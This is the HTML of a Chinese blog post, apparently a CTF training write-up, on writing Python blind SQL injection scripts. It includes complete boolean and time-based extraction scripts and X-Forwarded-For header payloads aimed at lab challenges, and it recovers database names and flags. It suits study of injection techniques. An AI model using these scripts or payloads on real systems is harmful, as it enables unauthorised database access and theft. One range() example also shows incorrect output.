@@ -1,0 +1,817 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="-web -mysql -python," />
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="mrl64's Blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="前言盲注作为sql注入最常见的考点，掌握脚本的编写是十分重要的，盲注脚本分为布尔盲注和时间盲注，同时还有字典法和二分法。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="python盲注脚本编写">
+<meta property="og:url" content="http://example.com/2021/11/19/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/index.html">
+<meta property="og:site_name" content="mrl64&#39;s Blog">
+<meta property="og:description" content="前言盲注作为sql注入最常见的考点，掌握脚本的编写是十分重要的，盲注脚本分为布尔盲注和时间盲注，同时还有字典法和二分法。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/11/19/NXIDZzoxnrsHFfl.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/19/RoeEs9Q4TznXypG.png">
+<meta property="og:image" content="https://i.loli.net/2021/11/19/HCR7yZmtNLkOqoQ.png">
+<meta property="article:published_time" content="2021-11-19T04:47:02.000Z">
+<meta property="article:modified_time" content="2021-11-19T13:53:36.147Z">
+<meta property="article:author" content="liszt_lin">
+<meta property="article:tag" content="-web -mysql -python">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/11/19/NXIDZzoxnrsHFfl.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://example.com/2021/11/19/python盲注脚本编写/"/>
+
+
+
+
+
+  <title>python盲注脚本编写 | mrl64's Blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">mrl64's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            Categories
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2021/11/19/python%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="mrl64's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">python盲注脚本编写</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-11-19T12:47:02+08:00">
+                2021-11-19
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index">
+                    <span itemprop="name">web</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <blockquote>
+<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>盲注作为sql注入最常见的考点，掌握脚本的编写是十分重要的，盲注脚本分为布尔盲注和时间盲注，同时还有字典法和二分法。</p>
+</blockquote>
+<span id="more"></span>
+
+<h1 id="编写脚本常用的函数"><a href="#编写脚本常用的函数" class="headerlink" title="编写脚本常用的函数"></a>编写脚本常用的函数</h1><p>先介绍几个写脚本时常用的python函数。</p>
+<h2 id="range"><a href="#range" class="headerlink" title="range()"></a>range()</h2><p>函数格式为<code>range(start,stop[,step])</code>，分别表示起始值，终止值与步长。如果不指定start值则默认为0，不指定步长则默认为1，range()的作用是创建一个整数列表，范围为start~(stop-1)，一般用于for循环中。下面提供几个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">for i in range(1,5):</span><br><span class="line">	print(i)</span><br><span class="line"></span><br><span class="line">结果：1 2 3 4</span><br><span class="line"></span><br><span class="line">for i in range(3):</span><br><span class="line">	print(i)</span><br><span class="line">结果：1 2</span><br></pre></td></tr></table></figure>
+
+<h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>函数格式为<code>for iterating_var in sequence:    statements(s)</code>，是我们编写脚本的基石。python中的for循环和c的for循环还是有很大差别的，python的for循环首先将sequence中的一个值赋值给iterating_var，然后进行循环语句，执行完后继续赋值执行，知道所有值都赋给了iterating_var一遍。下面提供几个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">for i in &#x27;nihao&#x27;:</span><br><span class="line">	print(&quot;%s&quot;% i)</span><br><span class="line"></span><br><span class="line">结果：n i h a o</span><br><span class="line"></span><br><span class="line">dic=[&#x27;union&#x27;,&#x27;ascii&#x27;,&#x27;long&#x27;]</span><br><span class="line">for i in dic:</span><br><span class="line">	print(&#x27;%s&#x27;% dic)</span><br><span class="line"></span><br><span class="line">结果：union ascii long</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="format"><a href="#format" class="headerlink" title="format()"></a>format()</h2><p>格式化函数，通过<code>&#123;&#125;</code>和<code>:</code>来构建语句，用format函数中的内容替代前面{}中的内容。format()可以接受不限个参数，位置可以不按顺序。直接上几个例子来直观感受（例子引用自菜鸟教程）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&quot;&#123;&#125; &#123;&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;)    # 不设置指定位置，按默认顺序</span><br><span class="line">&#x27;hello world&#x27;</span><br><span class="line"> </span><br><span class="line">&quot;&#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;)  # 设置指定位置</span><br><span class="line">&#x27;hello world&#x27;</span><br><span class="line"> </span><br><span class="line">&quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;)  # 设置指定位置</span><br><span class="line">&#x27;world hello world&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 设置参数</span><br><span class="line">print(&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;.format(name=&quot;菜鸟教程&quot;, url=&quot;www.runoob.com&quot;))</span><br><span class="line"> </span><br><span class="line"># 通过字典设置参数</span><br><span class="line">site = &#123;&quot;name&quot;: &quot;菜鸟教程&quot;, &quot;url&quot;: &quot;www.runoob.com&quot;&#125;</span><br><span class="line">print(&quot;网站名：&#123;name&#125;, 地址 &#123;url&#125;&quot;.format(**site))</span><br><span class="line"> </span><br><span class="line"># 通过列表索引设置参数</span><br><span class="line">my_list = [&#x27;菜鸟教程&#x27;, &#x27;www.runoob.com&#x27;]</span><br><span class="line">print(&quot;网站名：&#123;0[0]&#125;, 地址 &#123;0[1]&#125;&quot;.format(my_list))  # &quot;0&quot; 是必须的</span><br><span class="line"></span><br><span class="line">以上三条结果均为：</span><br><span class="line">网站名：菜鸟教程, 地址 www.runoob.com</span><br></pre></td></tr></table></figure>
+
+<p>当然使用%进行格式化也是可以的，这里也给一个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)^1&quot; % (1, 64)</span><br><span class="line"></span><br><span class="line">params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),1,1))&gt;64)^1&quot;</span><br><span class="line"></span><br><span class="line"># 上两式是等价的</span><br></pre></td></tr></table></figure>
+
+<h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><p>进行GET请求或者POST请求来获取页面：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">r = requests.get(&#x27;url&#x27;) #get请求</span><br><span class="line">r = requests.post(&#x27;url&#x27;，data=&#123;&#x27;key&#x27;=&#x27;value&#x27;&#125;) #post请求</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="parms"><a href="#parms" class="headerlink" title="parms"></a>parms</h2><p>params关键字参数可以用一个字符串字典来提供这些参数。方法申明一个params关键字后，就不允许在其后面再有任何其他参数。这里也简单给个例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload=&#123;&quot;id&quot;: &quot;1&quot;&#125;</span><br><span class="line">r = requests.get(&quot;http://127.0.0.1&quot;,params=payload)</span><br><span class="line"></span><br><span class="line">结果：http://127.0.0.1/?id=1</span><br></pre></td></tr></table></figure>
+
+<h2 id="headers"><a href="#headers" class="headerlink" title="headers"></a>headers</h2><p>用来将头文件写入，对于cookie注入、xff伪造的题目等需要用到</p>
+<h2 id="data"><a href="#data" class="headerlink" title="data"></a>data</h2><p>用于POST时将数据传入。</p>
+<h2 id="time-sleep"><a href="#time-sleep" class="headerlink" title="time.sleep()"></a>time.sleep()</h2><p>推迟调用线程的运行，格式为time.sleep(sec),可以通过设置参数sec来调整秒数，这个函数没有返回值。</p>
+<h2 id="time-time"><a href="#time-time" class="headerlink" title="time.time()"></a>time.time()</h2><p>返回当前时间的时间戳，这个函数没有参数，用于时间盲注时使用。</p>
+<h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>python不像c一样使用花括号将函数语句括起，因此编写程序时尤其要注意代码的缩进，相邻同缩进的代码意味着一堆代码块。</p>
+<h1 id="布尔盲注脚本"><a href="#布尔盲注脚本" class="headerlink" title="布尔盲注脚本"></a>布尔盲注脚本</h1><p>目前认识到的脚本主要就两种，字典法与二分法。刚好这次培训课都有，我就直接拿来用。</p>
+<p>首先是字典爆破法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">dic = &quot;abcdefghijklmnopqrstuvwxyz1234567890_@&quot;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,20):</span><br><span class="line">    for char in dic:</span><br><span class="line">        url = &quot;http://e9ea91bf-1968-4779-b9aa-52f15b8ef793.node4.buuoj.cn/Less-8/?id=1&#x27;&quot;</span><br><span class="line">        payload = &quot;and substr((select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;--+&quot;.format(i,char)</span><br><span class="line">        url = url + payload</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        time.sleep(0.05)</span><br><span class="line">        if &quot;are&quot; in r.text:</span><br><span class="line">            flag += char</span><br><span class="line">            print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>这个脚本是拿来跑sqli-labs-less8的，用的是buu的环境，跑的是security库中的表名。这个脚本解释一下就是将dic的内容一个一个试，如果试出来页面回显的内容有一个“are”就记录到flag中，依次打印，并在最后将最终结果打印出来。sleep函数是为了限制程序运行的速度以免速度过快导致页面不稳定或重复打印。而且要注意，这个方法不区分大小写。</p>
+<p>二分法本来给的是[极客大挑战2019]finalsql的脚本，我直接贴出来了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://31bff700-e9d3-434e-8498-3eae23e162ac.node4.buuoj.cn:81/search.php&quot;</span><br><span class="line">params = &#123;&quot;id&quot;: &quot;&quot;&#125;</span><br><span class="line">flag= &quot;&quot;</span><br><span class="line">for i in range(1, 500):</span><br><span class="line">    time.sleep(0.06)</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high)&gt;&gt;1</span><br><span class="line">    while (low &lt; high):</span><br><span class="line">        params[&quot;id&quot;] = &quot;1^(ascii(substr((select(group_concat(password))from(F1naI1y)),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i,mid)</span><br><span class="line">        r = requests.get(url, params=params)</span><br><span class="line">        time.sleep(0.05)</span><br><span class="line">        if &quot;Cl&quot; in r.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) &gt;&gt;1</span><br><span class="line">    if (mid == 32 or mid == 127):</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>二分法跑脚本的效率是远高于字典法的，当然这里用到的是堆叠注入。ascii码32到128是可打印字符，因此我们判断也是取这个范围。首先我们拿中间值（也就是80）去进行判断，如果大于80就拿右半部分的中间值判断，反之拿左半部分的中间值判断，直到判断成功后，将这个值加一后赋值给flag储存。至于为什么要加一，是因为我们判断语句是大于号，因此实际值会与测试值相差一位，我们要补上这一位。</p>
+<h1 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h1><p>时间盲注脚本和布尔盲注脚本的区别主要在于原理和payload的构建上。这里直接贴一部分出来：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">while low &lt; high:</span><br><span class="line">		payload = &quot;if(ascii(substr((select table_name from information_schema.tables where table_schema=&#x27;security&#x27;),%d,1))&gt;%d,sleep(1),0)&quot;%(i,mid)</span><br><span class="line">		params = &#123;&#x27;id&#x27;:payload&#125;</span><br><span class="line">		start_time = time.time()</span><br><span class="line">		r = requests.get(url,params = params)</span><br><span class="line">		end_time = time.time()</span><br><span class="line">		if end_time - start_time &gt; 1:</span><br><span class="line">			low = mid + 1</span><br><span class="line">		else:</span><br><span class="line">			high = mid</span><br><span class="line">		mid = (low + high) // 2</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>首先原理依然是二分法。在payload构建中，我们使用了if语句，让查询语句如果为真，就执行sleep(1)函数，再根据加载时间是否为1判断查询语句真假。其他方面和布尔盲注没有太大区别。</p>
+<h1 id="作业wp"><a href="#作业wp" class="headerlink" title="作业wp"></a>作业wp</h1><h2 id="极客大挑战2019-finalsql"><a href="#极客大挑战2019-finalsql" class="headerlink" title="[极客大挑战2019]finalsql"></a>[极客大挑战2019]finalsql</h2><p>这题由于脚本已经给了就没什么好写的，主要要注意这题的注入点不在POST框中，而是在点击数字后页面中以GET形式注入，更改id后的值即可。脚本在上文有，爆库爆表可以自行修改，这题主要是过滤了空格和其他查询方式的相关关键字。</p>
+<p>还有要吐槽一点，这个表里面的数据又臭又长，flag藏在最后，绝了。</p>
+<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>这题也是相当恶心人了。如果没有去查看源码的话可能就会GET一个url进去然后和这个url斗智斗勇。但是查看源码后我们发现这么一段：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Debug Info: Duration: 0.095027923583984 s Current Ip: 222.76.115.182  </span><br></pre></td></tr></table></figure>
+
+<p>看到这个current ip马上就能想到xff，我们伪造一个xff试试：<br><img src="https://i.loli.net/2021/11/19/NXIDZzoxnrsHFfl.png"></p>
+<p>我们发现current ip已经更改了，而由于我上个测试的是111，因此last ip就是111，如果我们再注入一次111，那么current ip就会变成111而last ip会变成1’or’1。但是当我们在这种情况下再注入一次111，我们会发现有意思的事出现了：<br><img src="https://i.loli.net/2021/11/19/RoeEs9Q4TznXypG.png"></p>
+<p>我们发现last ip变成了1，这说明1’or’1语句被执行了。这是由于当两次上传的内容相同时，current ip也是相同的，因此数据库就会找到last ip并执行。那么很明显，这里就是注入点了，所以这和proxy一点关系都没有（，只能说你这注入点挺能藏啊。</p>
+<p>这题要用到的是盲注，我们使用布尔盲注，而且题目提示我们flag在uuid里，因此cookie里的uuid这段便是我们的目标。综合以上，我们开始写脚本：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://node4.buuoj.cn:28368/&quot;</span><br><span class="line">head = &#123;</span><br><span class="line">    &quot;Cookie&quot;: &quot;track_uuid=9500a345-a839-4645-aee4-f9c598b48bf2&quot;,</span><br><span class="line">    &quot;X-Forwarded-For&quot;: &quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 150):</span><br><span class="line">    time.sleep(0.06)</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) &gt;&gt; 1</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        head[&quot;X-Forwarded-For&quot;] = &quot;0&#x27; or ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125; or&#x27;0&quot;.format(i, mid)</span><br><span class="line">        r = requests.post(url, headers=head)</span><br><span class="line">        head[&quot;X-Forwarded-For&quot;] = &quot;111&quot;</span><br><span class="line">        r = requests.post(url, headers=head)</span><br><span class="line">        r = requests.post(url, headers=head)</span><br><span class="line">        time.sleep(0.05)</span><br><span class="line">        if &quot;Last Ip: 1&quot; in r.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) &gt;&gt; 1</span><br><span class="line">    if (mid == 32 or mid == 127):</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
+
+<p>跑出来库名：<br><img src="https://i.loli.net/2021/11/19/HCR7yZmtNLkOqoQ.png"></p>
+<p>猜测flag在F4l9_D4t4B45e库中，接下来构建查表、查列、查数据的payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#查表</span><br><span class="line">&quot;0&#x27; or ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125; or&#x27;0&quot;.format(i, mid)</span><br><span class="line">#结果：F4l9_t4b1e</span><br><span class="line"></span><br><span class="line">#查列</span><br><span class="line">&quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br><span class="line">#结果：F4l9_C01uMn</span><br><span class="line"></span><br><span class="line">#查数据</span><br><span class="line">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br><span class="line">#结果：flag&#123;G1zj1n_W4nt5_4_91r1_Fr1end&#125;,flag&#123;20c02151-818b-4e3e-b853-322da92a0bed&#125;</span><br></pre></td></tr></table></figure>
+
+<p>总之盲注题的难点还是在找到注入点这一步上。</p>
+<h2 id="GYCTF2020-Ezsqli"><a href="#GYCTF2020-Ezsqli" class="headerlink" title="[GYCTF2020]Ezsqli"></a>[GYCTF2020]Ezsqli</h2><p>这题其实上次无列名时已经写了一遍，但是当时的脚本是扒的，这次就自己写一个，具体原理可以参考我上次那篇无列名注入的博客。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">url = &quot;http://1457e2ab-f8cd-42b7-b357-2f9db3f89820.node4.buuoj.cn:81/index.php&quot;</span><br><span class="line">payload = &#123;&quot;id&quot;: &quot;&quot;&#125;</span><br><span class="line">flag = &quot;&quot;</span><br><span class="line">for i in range(1, 150):</span><br><span class="line">    time.sleep(0.06)</span><br><span class="line">    low = 32</span><br><span class="line">    high = 128</span><br><span class="line">    mid = (low + high) &gt;&gt; 1</span><br><span class="line">    while low &lt; high:</span><br><span class="line">        payload[&quot;id&quot;] = &quot;1^(ascii(substr((select group_concat(table_name) from sys.schema_table_statistics where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;)^1&quot;.format(i, mid)</span><br><span class="line">        r = requests.post(url, data=payload)</span><br><span class="line">        time.sleep(0.05)</span><br><span class="line">        if &#x27;Nu1L&#x27; in r.text:</span><br><span class="line">            low = mid + 1</span><br><span class="line">        else:</span><br><span class="line">            high = mid</span><br><span class="line">        mid = (low + high) &gt;&gt; 1</span><br><span class="line">    if (mid == 32 or mid == 127):</span><br><span class="line">        break</span><br><span class="line">    flag += chr(mid)</span><br><span class="line">    print(flag)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
